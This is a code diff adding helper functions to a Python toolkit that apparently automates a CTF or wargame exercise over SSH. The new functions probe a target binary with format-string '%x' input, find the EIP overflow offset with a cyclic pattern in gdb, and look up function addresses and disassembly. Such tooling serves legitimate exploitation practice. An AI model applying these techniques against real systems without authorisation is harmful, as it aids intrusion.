@@ -5,7 +5,7 @@ from paramiko.client import SSHClient
 
 from .base import save_token, get_current_level, get_previous_password, get_current_level_num, dev_null, pipe
 from .config import VM_ADDRESS, VM_PORT
-from .text import print_title, print_action
+from .text import print_title, print_action, print_output
 
 
 def connect(user: str, password: str):
@@ -115,5 +115,59 @@ def upload_to(file_name: str):
     print_title(f'Upload file {file_name}')
     print_action(command)
     subprocess.call(command.split(' '), stderr=open(os.devnull, 'w'))
+
+
+def find_buffer_position(client, stack_search_count=20, binary_name=get_current_level(), title=None):
+    if title:
+        print_title(title)
+    test_str = '....'
+    test_str_hex = test_str.encode('utf-8').hex()
+    script = f'print "{test_str} " + "%x " * {stack_search_count}'
+    stack = exec(client, f"python -c '{script}' | ./{binary_name}")[0]
+    print_output(stack)
+    buffer_position = 0
+    for i, s in enumerate(stack.split(' ')):
+        if s == str(test_str_hex):
+            buffer_position = i
+            break
+    print_title(f'Buffer position: {buffer_position}')
+    return buffer_position
+
+
+def get_func_address(client, name, binary_name=get_current_level()):
+    address = exec(
+        client, f'echo "info func" | gdb ./{binary_name} -q | egrep " {name}$" | awk \'{{print $1}}\'',
+        title=f'Get #{name} address')[0]
+    return address
+
+
+def find_offset(client, binary_name=get_current_level(), title=None, register='eip'):
+    if title:
+        print_title(title)
+    test_string = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT' \
+                  'UUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll' \
+                  'mmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
+    address = exec(client, f'echo "r {test_string}\ni r" | '
+                           f'gdb ./{binary_name} -q | '
+                           f'grep "{register}" | '
+                           f'sed \'s/(gdb)//\' | '
+                           f'awk \'{{print $2}}\''
+                   )
+    if address:
+        address_short = bytes.fromhex(address[0].split('x')[1][:2]).decode('ascii')
+        num = 65
+        if address_short.islower():
+            num = num + 6
+        offset = (ord(address_short[0]) - num) * 4
+        print_output(f'{offset}', f'{register.upper()} Offset')
+        return offset
+    return 0
+
+
+def get_func_structure(client, name, binary_name=get_current_level(), title=None):
+    structure = exec(client, f'echo "disass {name}" | gdb ./{binary_name} -q', title=f'Get #{name} structure')
+    print_output(structure)
+    if title:
+        print_title(title)
 
 
